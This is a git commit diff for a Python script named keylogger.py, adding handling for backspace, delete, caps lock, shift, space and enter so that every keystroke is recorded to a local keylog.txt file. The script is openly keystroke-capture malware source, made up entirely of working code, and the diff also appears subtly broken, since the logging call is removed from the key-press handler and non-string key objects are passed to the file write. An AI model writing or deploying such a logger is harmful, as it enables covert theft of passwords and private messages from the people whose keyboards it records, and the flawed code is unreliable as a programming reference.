045d8676646cc1a55617bca3ebd368dfa4e82ed9
s21ry1 <surya7official@gmail.com>
2024-02-03 14:17:40 +0530

    adding input features

--- keylogger.py
+++ keylogger.py
@@ -7,26 +7,47 @@ keys_pressed = []
 # The function to be called when a key is pressed
 def on_key_press(key):
     keys_pressed.append(key)
-    write_to_file(keys_pressed)
 
 # The function to be called when a key is released
 def on_key_release(key):
     if key == keyboard.Key.esc:
         # If the Esc key is pressed, stop the listener
         return False
+    elif key == keyboard.Key.backspace:
+        keys_pressed.append(key)
+    elif key == keyboard.Key.delete:
+        keys_pressed.append(key)
+    elif key == keyboard.Key.caps_lock:
+        keys_pressed.append(key)
+    elif key == keyboard.Key.space:
+        keys_pressed.append(' ')
+    elif key == keyboard.Key.enter:
+        keys_pressed.append('\n')
+    elif key == keyboard.Key.shift:
+        keys_pressed.append(key)
+    elif key.char == '':
+        return
+    else:
+        keys_pressed.append(key.char)
 
 # The function to write the keys pressed to a file
 def write_to_file(keys):
     with open("keylog.txt", "a") as f:
         for key in keys:
-            if key == keyboard.Key.space:
+            if key == keyboard.Key.backspace:
+                f.write('<Backspace>')
+            elif key == keyboard.Key.delete:
+                f.write('<Delete>')
+            elif key == keyboard.Key.caps_lock:
+                f.write('<Caps Lock>')
+            elif key == keyboard.Key.space:
                 f.write(' ')
             elif key == keyboard.Key.enter:
                 f.write('\n')
             elif key == keyboard.Key.shift:
-                continue
+                f.write('<Shift>')
             else:
-                f.write(key.char)
+                f.write(key)
     keys_pressed.clear()
 
 # Start the listener
